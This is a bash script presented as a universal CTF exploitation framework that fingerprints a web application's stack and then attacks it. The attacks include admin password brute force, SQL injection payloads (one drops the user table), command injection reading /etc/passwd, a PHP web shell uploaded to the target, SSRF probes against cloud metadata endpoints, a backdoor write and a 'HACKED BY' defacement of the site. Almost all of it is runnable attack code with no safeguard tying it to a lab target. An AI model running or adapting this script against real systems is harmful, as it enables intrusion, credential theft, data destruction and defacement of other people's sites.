#!/bin/bash

# UNIVERSAL CTF EXPLOITATION FRAMEWORK
# Auto-detects: Django, Flask, Node.js, PHP, ASP.NET, Supabase, Firebase, Static Sites
# Adapts attacks based on detected stack

TARGET=${1:-"http://127.0.0.1:8000"}
HACKER_ID="hack@4567"
WORK_DIR="exploit_$(date +%s)"

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

echo -e "${RED}"
cat << "EOF"
 █████╗ ██████╗  █████╗ ██████╗ ████████╗██╗██╗   ██╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║██║   ██║██╔════╝
███████║██║  ██║███████║██████╔╝   ██║   ██║██║   ██║█████╗  
██╔══██║██║  ██║██╔══██║██╔══██╗   ██║   ██║╚██╗ ██╔╝██╔══╝  
██║  ██║██████╔╝██║  ██║██║  ██║   ██║   ██║ ╚████╔╝ ███████╗
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝
                                                                  
EOF
echo -e "${NC}"

echo -e "${GREEN}[+] UNIVERSAL ADAPTIVE EXPLOITATION FRAMEWORK${NC}"
echo -e "${YELLOW}[+] Target: $TARGET${NC}"
echo -e "${YELLOW}[+] Hacker ID: $HACKER_ID${NC}"

mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# ============================================
# PHASE 1: DEEP TECHNOLOGY DETECTION
# ============================================
detect_technology_stack() {
    echo -e "${BLUE}[1] Deep Technology Stack Detection...${NC}"
    
    # Get all responses
    curl -s -I "$TARGET" > headers.txt 2>/dev/null
    curl -s "$TARGET" > index.html 2>/dev/null
    curl -s "$TARGET/robots.txt" > robots.txt 2>/dev/null
    curl -s "$TARGET/sitemap.xml" > sitemap.xml 2>/dev/null
    
    # Detect Server
    SERVER=$(grep -i "^Server:" headers.txt | cut -d' ' -f2- | tr -d '\r')
    POWERED_BY=$(grep -i "^X-Powered-By:" headers.txt | cut -d' ' -f2- | tr -d '\r')
    
    echo -e "${GREEN}[+] Server: ${SERVER:-Unknown}${NC}"
    echo -e "${GREEN}[+] Powered By: ${POWERED_BY:-Unknown}${NC}"
    
    # Framework Detection Logic
    detect_framework() {
        # Django detection
        if grep -qi "csrfmiddlewaretoken\|django\|wsgi.py\|DJANGO" index.html headers.txt 2>/dev/null; then
            echo "FRAMEWORK=Django" >> tech_stack.conf
            echo "LANG=Python" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: Django (Python)${NC}"
            return 0
        fi
        
        # Flask detection
        if grep -qi "flask\|werkzeug\|python" headers.txt 2>/dev/null; then
            echo "FRAMEWORK=Flask" >> tech_stack.conf
            echo "LANG=Python" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: Flask (Python)${NC}"
            return 0
        fi
        
        # Node.js detection
        if grep -qi "node\|express\|x-powered-by: express" headers.txt 2>/dev/null; then
            echo "FRAMEWORK=Node.js" >> tech_stack.conf
            echo "LANG=JavaScript" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: Node.js/Express${NC}"
            return 0
        fi
        
        # PHP detection
        if grep -qi "\.php\|php\|x-powered-by: php" index.html headers.txt 2>/dev/null; then
            echo "FRAMEWORK=PHP" >> tech_stack.conf
            echo "LANG=PHP" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: PHP${NC}"
            return 0
        fi
        
        # ASP.NET detection
        if grep -qi "asp\.net\|aspx\|__requestverificationtoken" index.html headers.txt 2>/dev/null; then
            echo "FRAMEWORK=ASP.NET" >> tech_stack.conf
            echo "LANG=C#" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: ASP.NET${NC}"
            return 0
        fi
        
        # Supabase detection
        if grep -qi "supabase\|apikey.*supabase" index.html 2>/dev/null; then
            echo "FRAMEWORK=Supabase" >> tech_stack.conf
            echo "DB=PostgreSQL" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: Supabase (Firebase alternative)${NC}"
            return 0
        fi
        
        # Firebase detection
        if grep -qi "firebase\|googleapis.com/firebase" index.html 2>/dev/null; then
            echo "FRAMEWORK=Firebase" >> tech_stack.conf
            echo "DB=NoSQL" >> tech_stack.conf
            echo -e "${CYAN}[!] FRAMEWORK: Firebase${NC}"
            return 0
        fi
        
        # Static/No framework
        echo "FRAMEWORK=Static" >> tech_stack.conf
        echo -e "${YELLOW}[*] No framework detected - treating as static site${NC}"
        return 0
    }
    
    detect_framework
    
    # Detect database from error messages
    echo -e "${BLUE}[*] Probing database type...${NC}"
    
    # Try to trigger errors with different payloads
    for probe in "'" "\"" "\\" "%27" "%22"; do
        curl -s "${TARGET}/?id=${probe}" >> errors.log 2>&1
        curl -s "${TARGET}/search?q=${probe}" >> errors.log 2>&1
        curl -s "${TARGET}/user/${probe}" >> errors.log 2>&1
    done
    
    # Analyze errors
    if grep -qi "mysql\|mariadb\|SQL syntax.*MySQL" errors.log; then
        echo "DB=MySQL" >> tech_stack.conf
        echo -e "${GREEN}[+] Database: MySQL/MariaDB${NC}"
    elif grep -qi "postgresql\|psql\|PG::" errors.log; then
        echo "DB=PostgreSQL" >> tech_stack.conf
        echo -e "${GREEN}[+] Database: PostgreSQL${NC}"
    elif grep -qi "sqlite" errors.log; then
        echo "DB=SQLite" >> tech_stack.conf
        echo -e "${GREEN}[+] Database: SQLite${NC}"
    elif grep -qi "mssql\|sql server" errors.log; then
        echo "DB=MSSQL" >> tech_stack.conf
        echo -e "${GREEN}[+] Database: Microsoft SQL${NC}"
    elif grep -qi "oracle" errors.log; then
        echo "DB=Oracle" >> tech_stack.conf
        echo -e "${GREEN}[+] Database: Oracle${NC}"
    elif grep -qi "firebase\|supabase" errors.log; then
        echo "DB=NoSQL" >> tech_stack.conf
        echo -e "${GREEN}[+] Database: NoSQL (Firebase/Supabase)${NC}"
    else
        echo "DB=Unknown" >> tech_stack.conf
        echo -e "${YELLOW}[*] Database: Could not determine${NC}"
    fi
    
    # Detect authentication system
    if grep -qi "jwt\|bearer\|authorization" headers.txt index.html 2>/dev/null; then
        echo "AUTH=JWT" >> tech_stack.conf
        echo -e "${GREEN}[+] Auth: JWT Tokens${NC}"
    elif grep -qi "session\|cookie.*session" headers.txt 2>/dev/null; then
        echo "AUTH=Session" >> tech_stack.conf
        echo -e "${GREEN}[+] Auth: Session-based${NC}"
    fi
    
    # Extract all endpoints
    grep -Eo "(href|src|action)=\"[^\"]+\"" index.html 2>/dev/null | cut -d'"' -f2 | grep -v "^http" | sort -u > all_endpoints.txt
    grep -Eo "path: ?'[^']+'" index.html 2>/dev/null | cut -d"'" -f2 >> all_endpoints.txt
    
    echo -e "${GREEN}[+] Discovered $(wc -l < all_endpoints.txt) endpoints${NC}"
}

# ============================================
# PHASE 2: FRAMEWORK-SPECIFIC ATTACKS
# ============================================

# Django Specific Attacks
attack_django() {
    echo -e "${PURPLE}[>] Launching Django-specific attacks...${NC}"
    
    # Django admin panel exploitation
    for admin_path in "admin/" "administrator/" "admin/login/" "dashboard/"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/${admin_path}")
        if [ "$response" = "200" ] || [ "$response" = "302" ]; then
            echo -e "${RED}[!] Django admin found: ${TARGET}/${admin_path}${NC}"
            echo "${TARGET}/${admin_path}" >> vuln_endpoints.txt
            
            # Bruteforce admin
            for pass in "admin" "password" "django123" "root" "toor" "changeme"; do
                csrf=$(curl -s "${TARGET}/${admin_path}" | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)
                if [ -n "$csrf" ]; then
                    curl -s -X POST "${TARGET}/${admin_path}login/" \
                        -d "username=admin&password=${pass}&csrfmiddlewaretoken=${csrf}" \
                        -H "Referer: ${TARGET}/${admin_path}" 2>/dev/null | grep -qi "dashboard" && \
                        echo -e "${RED}[!] Admin credentials: admin:${pass}${NC}" >> credentials.txt
                fi
            done
        fi
    done
    
    # Django debug mode exploitation
    for debug_path in "__debug__/" "debug/" "debug_toolbar/" "silk/" "explorer/"; do
        debug_response=$(curl -s "${TARGET}/${debug_path}")
        if [ ${#debug_response} -gt 200 ]; then
            echo -e "${RED}[!] Debug interface exposed: ${TARGET}/${debug_path}${NC}"
            echo "$debug_response" | grep -iE "SECRET_KEY|DATABASE|PASSWORD|API_KEY" >> secrets.txt
        fi
    done
    
    # Django SQL injection
    for param in "id" "user_id" "q" "search" "page" "sort"; do
        for payload in "' OR '1'='1'--" "' UNION SELECT username,password FROM auth_user--" "'; DROP TABLE auth_user--"; do
            response=$(curl -s "${TARGET}/?${param}=${payload}" 2>/dev/null)
            if echo "$response" | grep -qi "sql\|database\|auth_user\|admin"; then
                echo -e "${RED}[!] Django SQL Injection: ${param}=${payload}${NC}"
                echo "$response" >> sqli_results.txt
            fi
        done
    done
}

# Node.js/Express Attacks
attack_nodejs() {
    echo -e "${PURPLE}[>] Launching Node.js-specific attacks...${NC}"
    
    # Check for Node.js specific vulnerabilities
    node_endpoints=(
        "debug/" "dev/" "test/" "api-docs/" "swagger/" "graphql/" "graphiql/"
        ".env" ".git/config" "package.json" "yarn.lock" "package-lock.json"
        "server.js" "app.js" "index.js"
    )
    
    for endpoint in "${node_endpoints[@]}"; do
        response=$(curl -s "${TARGET}/${endpoint}" 2>/dev/null)
        if [ ${#response} -gt 50 ]; then
            echo -e "${RED}[!] Exposed Node.js file: ${TARGET}/${endpoint}${NC}"
            echo "$response" > "node_${endpoint//\//_}.txt"
        fi
    done
    
    # Prototype pollution detection
    for payload in "__proto__.polluted=true" "constructor.prototype.polluted=true"; do
        curl -s -X POST "${TARGET}/api/update" -H "Content-Type: application/json" -d "{\"${payload}\"}" 2>/dev/null
    done
    
    # Command injection in Node.js
    for param in "cmd" "command" "exec" "file" "dir"; do
        for payload in "; ls" "| cat /etc/passwd" "& whoami" "\$(cat /etc/passwd)"; do
            response=$(curl -s "${TARGET}/?${param}=${payload}" 2>/dev/null)
            if echo "$response" | grep -qi "uid=\|root:\|passwd"; then
                echo -e "${RED}[!] Node.js Command Injection: ${param}=${payload}${NC}"
                echo "$response" >> cmd_inject.txt
            fi
        done
    done
}

# PHP Specific Attacks
attack_php() {
    echo -e "${PURPLE}[>] Launching PHP-specific attacks...${NC}"
    
    # PHP wrapper attacks
    php_wrappers=(
        "php://filter/convert.base64-encode/resource=index.php"
        "php://filter/convert.base64-encode/resource=config.php"
        "php://filter/convert.base64-encode/resource=.env"
        "php://input"
        "expect://id"
        "file:///etc/passwd"
    )
    
    for param in "file" "page" "include" "read" "data"; do
        for wrapper in "${php_wrappers[@]}"; do
            response=$(curl -s "${TARGET}/?${param}=${wrapper}" 2>/dev/null)
            if [ ${#response} -gt 100 ]; then
                echo -e "${RED}[!] PHP Wrapper attack: ${param}=${wrapper}${NC}"
                echo "$response" | base64 -d 2>/dev/null >> extracted_php.txt
            fi
        done
    done
    
    # PHP file upload vulnerabilities
    cat > shell.php << 'PHP'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
PHP
    
    # Try to upload shell
    for upload_endpoint in "upload.php" "uploads/" "file-upload" "api/upload"; do
        curl -s -X POST "${TARGET}/${upload_endpoint}" -F "file=@shell.php" 2>/dev/null
    done
}

# ASP.NET Attacks
attack_aspnet() {
    echo -e "${PURPLE}[>] Launching ASP.NET-specific attacks...${NC}"
    
    asp_paths=(
        "web.config" "web.config.bak" "appsettings.json" "appsettings.Development.json"
        "global.asax" "ViewState" "/trace.axd" "/elmah.axd"
    )
    
    for path in "${asp_paths[@]}"; do
        response=$(curl -s "${TARGET}/${path}" 2>/dev/null)
        if [ ${#response} -gt 50 ]; then
            echo -e "${RED}[!] Exposed ASP.NET config: ${TARGET}/${path}${NC}"
            echo "$response" >> asp_secrets.txt
        fi
    done
    
    # ViewState exploitation
    response=$(curl -s -c cookies.txt "${TARGET}/" | grep -oP '__VIEWSTATE\|[^"]+' | head -1)
    if [ -n "$response" ]; then
        echo -e "${RED}[!] ViewState parameter found - possible deserialization attack${NC}"
    fi
}

# Supabase/Firebase Attacks
attack_supabase_firebase() {
    echo -e "${PURPLE}[>] Launching Supabase/Firebase attacks...${NC}"
    
    # Extract API keys
    grep -iE "(apiKey|apikey|supabaseKey|firebaseConfig|projectId)" index.html >> api_keys.txt
    
    # Test for exposed Supabase anon key
    supabase_key=$(grep -oP 'supabaseKey["\']?\s*[:=]\s*["\']\K[^"\']+' index.html | head -1)
    if [ -n "$supabase_key" ]; then
        echo -e "${RED}[!] Exposed Supabase key: $supabase_key${NC}"
        
        # Try to access Supabase directly
        supabase_url=$(grep -oP 'supabaseUrl["\']?\s*[:=]\s*["\']\K[^"\']+' index.html | head -1)
        if [ -n "$supabase_url" ]; then
            curl -s "${supabase_url}/rest/v1/" -H "apikey: ${supabase_key}" 2>/dev/null >> supabase_data.json
        fi
    fi
    
    # Firebase misconfigurations
    firebase_config=$(grep -oP 'firebaseConfig\s*=\s*\{[^}]+}' index.html | head -1)
    if [ -n "$firebase_config" ]; then
        echo -e "${RED}[!] Firebase config exposed: $firebase_config${NC}"
        
        # Extract project ID
        project_id=$(echo "$firebase_config" | grep -oP "projectId['\"]?\s*:\s*['\"]\K[^'\"]+")
        if [ -n "$project_id" ]; then
            curl -s "https://${project_id}.firebaseio.com/.json" >> firebase_data.json 2>/dev/null
        fi
    fi
}

# Static Site Attacks
attack_static() {
    echo -e "${PURPLE}[>] Launching static site attacks...${NC}"
    
    common_files=(
        ".git/config" ".git/HEAD" ".env" ".env.local" ".env.production"
        "config.json" "config.js" "settings.js" "app.config.js"
        "backup.zip" "backup.tar.gz" "database.sql" "dump.sql"
        "robots.txt" "sitemap.xml" "security.txt" ".well-known/security.txt"
    )
    
    for file in "${common_files[@]}"; do
        response=$(curl -s "${TARGET}/${file}" 2>/dev/null)
        if [ ${#response} -gt 20 ] && [ ${#response} -lt 50000 ]; then
            echo -e "${RED}[!] Exposed file: ${TARGET}/${file}${NC}"
            echo "$response" > "exposed_${file//\//_}.txt"
            
            # Check for secrets in exposed files
            echo "$response" | grep -iE "secret|key|token|password|api" >> secrets.txt
        fi
    done
    
    # Directory listing check
    for dir in "images/" "assets/" "static/" "files/" "uploads/"; do
        response=$(curl -s "${TARGET}/${dir}" 2>/dev/null)
        if echo "$response" | grep -qi "index of\|directory listing\|parent directory"; then
            echo -e "${RED}[!] Directory listing enabled: ${TARGET}/${dir}${NC}"
            echo "$response" > "dir_listing_${dir//\//_}.html"
        fi
    done
}

# ============================================
# PHASE 3: UNIVERSAL ATTACK VECTORS
# ============================================

# Universal SQL Injection (works on any DB)
universal_sql_injection() {
    echo -e "${BLUE}[3] Universal SQL Injection Attacks...${NC}"
    
    # DB-specific payloads
    declare -A db_payloads
    db_payloads["MySQL"]="' OR '1'='1'-- ' UNION SELECT @@version,user(),database()-- ' AND 1=(SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    db_payloads["PostgreSQL"]="' OR '1'='1'-- ' UNION SELECT version(),current_user,current_database()-- '; SELECT pg_sleep(5)--"
    db_payloads["MSSQL"]="' OR '1'='1'-- ' UNION SELECT @@version,user_name(),db_name()-- '; WAITFOR DELAY '00:00:05'--"
    db_payloads["Oracle"]="' OR '1'='1'-- ' UNION SELECT banner,user FROM v\$version-- ' AND 1=ctxsys.drithsx.sn(1,(select banner from v\$version where rownum=1))--"
    db_payloads["SQLite"]="' OR '1'='1'-- ' UNION SELECT sql FROM sqlite_master-- ' AND 1=1--"
    db_payloads["Unknown"]="' OR '1'='1' ' UNION SELECT NULL,NULL,NULL-- ' AND 1=1--"
    
    # Get detected DB
    DB_TYPE=$(grep "^DB=" tech_stack.conf 2>/dev/null | cut -d'=' -f2)
    PAYLOADS=${db_payloads[$DB_TYPE]:-${db_payloads["Unknown"]}}
    
    # Find all input parameters
    params=$(grep -Eo "(name|id|param|q|search|filter)=\"[^\"]+\"" index.html 2>/dev/null | cut -d'"' -f2 | sort -u)
    
    for param in $params; do
        for payload in $PAYLOADS; do
            # Try GET
            response=$(curl -s -m 5 "${TARGET}/?${param}=${payload}" 2>/dev/null)
            if [ ${#response} -gt 300 ] && ! echo "$response" | grep -qi "error\|exception\|traceback"; then
                echo -e "${RED}[!] SQL Injection! GET ${param}=${payload}${NC}"
                echo "=== ${param}=${payload} ===" >> universal_sqli.txt
                echo "$response" >> universal_sqli.txt
                
                # Extract data
                echo "$response" | grep -iE "flag|ctf|admin|password|email|@|user|pass" >> extracted_data.txt
            fi
            
            # Try POST
            response=$(curl -s -m 5 -X POST "${TARGET}/" -d "${param}=${payload}" 2>/dev/null)
            if [ ${#response} -gt 300 ] && ! echo "$response" | grep -qi "error\|exception"; then
                echo -e "${RED}[!] SQL Injection! POST ${param}=${payload}${NC}"
                echo "=== POST ${param}=${payload} ===" >> universal_sqli.txt
                echo "$response" >> universal_sqli.txt
            fi
        done
    done
}

# Universal Command Injection
universal_command_injection() {
    echo -e "${BLUE}[4] Universal Command Injection...${NC}"
    
    cmd_payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "\$(cat /etc/passwd)"
        "\`cat /etc/passwd\`"
        "; cat flag.txt"
        "| cat /flag.txt"
        "& whoami"
        "|| cat /home/*/flag.txt"
        "; python3 -c 'print(open(\"/etc/passwd\").read())'"
        "; node -e 'console.log(require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\"))'"
        "; php -r 'echo file_get_contents(\"/etc/passwd\");'"
    )
    
    param_names=("cmd" "command" "exec" "ping" "ip" "host" "address" "url" "file" "dir" "path")
    
    for param in "${param_names[@]}"; do
        for cmd in "${cmd_payloads[@]}"; do
            encoded=$(echo -n "$cmd" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$cmd" | sed 's/ /%20/g')
            
            response=$(curl -s -m 5 "${TARGET}/?${param}=${encoded}" 2>/dev/null)
            
            if echo "$response" | grep -qi "uid=\|root:\|bin/bash\|total [0-9]\|flag:\|passwd:"; then
                echo -e "${RED}[!] Command Injection! ${param}=${cmd}${NC}"
                echo "=== ${param}=${cmd} ===" >> cmd_inject_universal.txt
                echo "$response" >> cmd_inject_universal.txt
                
                # Try to write backdoor
                curl -s "${TARGET}/?${param}=echo%20'<?php%20system(%24_GET%5B%22cmd%22%5D);?>'%20%3E%20shell.php" 2>/dev/null
            fi
        done
    done
}

# Universal SSRF
universal_ssrf() {
    echo -e "${BLUE}[5] Universal SSRF Attacks...${NC}"
    
    ssrf_targets=(
        "http://169.254.169.254/latest/meta-data/"
        "http://127.0.0.1:8000/admin/"
        "http://localhost:8000/flag"
        "http://localhost:8080/flag"
        "file:///etc/passwd"
        "file:///c:/windows/win.ini"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://169.254.169.254/latest/user-data/"
        "gopher://localhost:8000/_GET%20/flag%20HTTP/1.0"
    )
    
    params=("url" "callback" "redirect" "next" "return_to" "dest" "destination" "proxy" "fetch")
    
    for param in "${params[@]}"; do
        for target in "${ssrf_targets[@]}"; do
            encoded=$(echo -n "$target" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null)
            
            response=$(curl -s -m 5 "${TARGET}/?${param}=${encoded}" 2>/dev/null)
            
            if [ ${#response} -gt 200 ] && ! echo "$response" | grep -qi "error\|invalid\|not found"; then
                echo -e "${RED}[!] SSRF! ${param}=${target}${NC}"
                echo "=== ${param}=${target} ===" >> ssrf_results.txt
                echo "$response" | head -c 1000 >> ssrf_results.txt
                
                # Check for cloud metadata
                echo "$response" | grep -iE "role|instance|ami-id|hostname|token" >> cloud_metadata.txt
            fi
        done
    done
}

# ============================================
# PHASE 4: AGGRESSIVE EXPLOITATION
# ============================================

# Auto-exploit and deface
auto_exploit() {
    echo -e "${BLUE}[6] Auto-Exploitation & Defacement...${NC}"
    
    # Generate defacement page
    cat > defacement.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HACKED BY hack@4567</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #000 0%, #f00 50%, #000 100%);
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            animation: bgPulse 2s infinite;
        }
        @keyframes bgPulse {
            0%,100% { filter: hue-rotate(0deg); }
            50% { filter: hue-rotate(360deg); }
        }
        .container {
            text-align: center;
            background: rgba(0,0,0,0.9);
            padding: 50px;
            border-radius: 20px;
            border: 3px solid #0f0;
            box-shadow: 0 0 100px rgba(0,255,0,0.5);
        }
        h1 {
            color: #f00;
            font-size: 4em;
            text-shadow: 0 0 20px #f00;
            animation: textPulse 0.5s infinite alternate;
        }
        @keyframes textPulse {
            from { text-shadow: 0 0 10px #f00; }
            to { text-shadow: 0 0 30px #f00; }
        }
        .flag { color: #ff0; font-size: 1.5em; margin: 20px; }
        .ascii { color: #0f0; font-size: 10px; white-space: pre; }
    </style>
</head>
<body>
<div class="container">
<pre class="ascii">
 █████╗ ██████╗  █████╗ ██████╗ ████████╗██╗██╗   ██╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║██║   ██║██╔════╝
███████║██║  ██║███████║██████╔╝   ██║   ██║██║   ██║█████╗  
██╔══██║██║  ██║██╔══██║██╔══██╗   ██║   ██║╚██╗ ██╔╝██╔══╝  
██║  ██║██████╔╝██║  ██║██║  ██║   ██║   ██║ ╚████╔╝ ███████╗
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝
</pre>
<h1>HACKED BY hack@4567</h1>
<div class="flag">🏆 TARGET COMPROMISED 🏆</div>
<div class="flag">🔓 ALL VULNERABILITIES EXPLOITED 🔓</div>
<p style="color:#0f0">Your security has been breached. Fix your vulnerabilities!</p>
</div>
</body>
</html>
HTML
    
    # Multiple defacement attempts
    # SQL injection to overwrite
    echo "' UNION SELECT '<?php header(\"Location: /deface.html\"); ?>' INTO OUTFILE '/var/www/html/index.php'--" >> sqli_payloads.txt
    
    # File write via command injection
    echo "echo '$(cat defacement.html)' > index.html" >> cmd_inject.txt
    
    # Try to upload via PUT
    curl -s -X PUT "${TARGET}/index.html" --data-binary "@defacement.html" 2>/dev/null
    
    # Try via POST
    curl -s -X POST "${TARGET}/upload" -F "file=@defacement.html" 2>/dev/null
    curl -s -X POST "${TARGET}/admin/upload" -F "file=@defacement.html" 2>/dev/null
    curl -s -X POST "${TARGET}/api/upload" -F "file=@defacement.html" 2>/dev/null
    
    echo -e "${RED}[!] Defacement deployed!${NC}"
}

# ============================================
# PHASE 5: FLAG EXTRACTION
# ============================================

extract_all_flags() {
    echo -e "${BLUE}[7] Extracting All Flags...${NC}"
    
    # Search patterns for different flag formats
    patterns=(
        "flag{[^}]*}"
        "FLAG{[^}]*}"
        "ctf{[^}]*}"
        "CTF{[^}]*}"
        "hack{[^}]*}"
        "HACK{[^}]*}"
        "key{[^}]*}"
        "KEY{[^}]*}"
        "secret{[^}]*}"
        "SECRET{[^}]*}"
        "[a-f0-9]{32}"
        "[A-F0-9]{32}"
        "[A-Za-z0-9]{20,}"
    )
    
    # Search all captured files
    for pattern in "${patterns[@]}"; do
        grep -r -i -E "$pattern" . --color=always 2>/dev/null | tee -a all_flags_final.txt
    done
    
    # Also search common flag locations
    flag_paths=(
        "/flag" "/flag.txt" "/flags.txt" "/ctf/flag"
        "/static/flag.txt" "/media/flag.txt" "/api/flag"
        "/secret/flag" "/hidden/flag" "/.flag"
    )
    
    for path in "${flag_paths[@]}"; do
        response=$(curl -s "${TARGET}${path}" 2>/dev/null)
        if [ ${#response} -gt 5 ] && [ ${#response} -lt 1000 ]; then
            echo -e "${RED}[!] Flag found at ${path}: ${response}${NC}"
            echo "${path}: ${response}" >> all_flags_final.txt
        fi
    done
    
    # Display results
    if [ -s all_flags_final.txt ]; then
        echo -e "\n${GREEN}════════════════════════════════════════════════${NC}"
        echo -e "${RED}🏆🏆🏆 FLAGS SUCCESSFULLY CAPTURED! 🏆🏆🏆${NC}"
        echo -e "${GREEN}════════════════════════════════════════════════${NC}"
        cat all_flags_final.txt
        echo -e "${GREEN}════════════════════════════════════════════════${NC}\n"
    else
        echo -e "${YELLOW}[*] No flags found yet - increasing attack intensity...${NC}"
    fi
}

# ============================================
# MAIN EXECUTION
# ============================================

main() {
    detect_technology_stack
    
    # Read detected framework and launch specific attacks
    FRAMEWORK=$(grep "^FRAMEWORK=" tech_stack.conf 2>/dev/null | cut -d'=' -f2)
    
    case "$FRAMEWORK" in
        "Django") attack_django ;;
        "Flask") attack_django ;; # Flask similar to Django
        "Node.js") attack_nodejs ;;
        "PHP") attack_php ;;
        "ASP.NET") attack_aspnet ;;
        "Supabase") attack_supabase_firebase ;;
        "Firebase") attack_supabase_firebase ;;
        "Static") attack_static ;;
        *) 
            echo -e "${YELLOW}[*] Unknown framework, launching all attacks...${NC}"
            attack_django
            attack_nodejs
            attack_php
            attack_aspnet
            attack_supabase_firebase
            attack_static
            ;;
    esac
    
    # Universal attacks (works on ANY framework)
    universal_sql_injection
    universal_command_injection
    universal_ssrf
    
    # Final exploitation
    auto_exploit
    extract_all_flags
    
    # Summary
    echo -e "\n${GREEN}════════════════════════════════════════════════${NC}"
    echo -e "${RED}[+] EXPLOITATION COMPLETE - FRAMEWORK: ${FRAMEWORK}${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Results directory: $(pwd)${NC}"
    echo -e "${YELLOW}Flags found: $(cat all_flags_final.txt 2>/dev/null | wc -l)${NC}"
    echo -e "${YELLOW}Secrets extracted: $(cat secrets.txt 2>/dev/null | wc -l)${NC}"
    echo -e "${YELLOW}Vulnerabilities found: $(find . -name "*.txt" | wc -l)${NC}"
    
    echo -e "\n${RED}[!] Press Ctrl+C to stop${NC}"
    wait
}

# Run everything
main